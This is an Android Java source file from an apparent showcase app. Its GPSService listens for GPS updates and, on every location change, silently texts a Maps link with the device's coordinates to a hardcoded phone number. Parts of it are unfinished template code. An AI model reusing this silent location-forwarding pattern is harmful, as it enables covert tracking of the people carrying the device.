package com.javpoblano.showcase.utils;

import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */

public class GPSService extends IntentService implements LocationListener{
    public  static final String ACTION_INIT = "com.javpoblano.showcase.utils.action.INIT";
    public static final String ACTION_SHUTDOWN = "com.javpoblano.showcase.utils.action.SHUTDOWN";
    public static final String EXTRA_METERS = "com.javpoblano.showcase.utils.extra.METERS";
    public static final String EXTRA_SECONDS = "com.javpoblano.showcase.utils.extra.SECONDS";

    LocationManager locationManager;
    LocationListener locationListener;

    public GPSService() {
        super("GPSService");
    }

    /**
     * Starts this service to perform action Foo with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startActionInit(Context context, int param1, int param2) {
        Intent intent = new Intent(context, GPSService.class);
        intent.setAction(ACTION_INIT);
        intent.putExtra(EXTRA_METERS, param1);
        intent.putExtra(EXTRA_SECONDS, param2);
        context.startService(intent);
    }

    /**
     * Starts this service to perform action Baz with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startActionShutdown(Context context, int param1, int param2) {
        Intent intent = new Intent(context, GPSService.class);
        intent.setAction(ACTION_SHUTDOWN);
        intent.putExtra(EXTRA_METERS, param1);
        intent.putExtra(EXTRA_SECONDS, param2);
        context.startService(intent);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            if (ACTION_INIT.equals(action)) {
                final int meters = intent.getIntExtra(EXTRA_METERS,0);
                final int seconds = intent.getIntExtra(EXTRA_SECONDS,0);
                handleActionInit(meters, seconds);
            } else if (ACTION_SHUTDOWN.equals(action)) {
                final int param1 = intent.getIntExtra(EXTRA_METERS,0);
                final int param2 = intent.getIntExtra(EXTRA_SECONDS,0);
                handleActionShutdown(param1, param2);
            }
        }
    }

    /**
     * Handle action Foo in the provided background thread with the provided
     * parameters.
     */
    private void handleActionInit(int meters, int seconds) {
        locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
        locationListener = this;
        try
        {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,seconds,meters,locationListener);
        }
        catch (SecurityException ex)
        {
            Log.d("err - gps",ex.getMessage());
        }
    }

    /**
     * Handle action Baz in the provided background thread with the provided
     * parameters.
     */
    private void handleActionShutdown(int param1, int param2) {
        // TODO: Handle action Baz
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onLocationChanged(Location location) {
        String url = "http://maps.google.com/maps?q="+location.getLatitude()+","+location.getLongitude();
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("2226857591",null,url,null,null);
    }

    @Override
    public void onStatusChanged(String s, int i, Bundle bundle) {

    }

    @Override
    public void onProviderEnabled(String s) {

    }

    @Override
    public void onProviderDisabled(String s) {

    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();
        locationManager.removeUpdates(locationListener);
    }


}
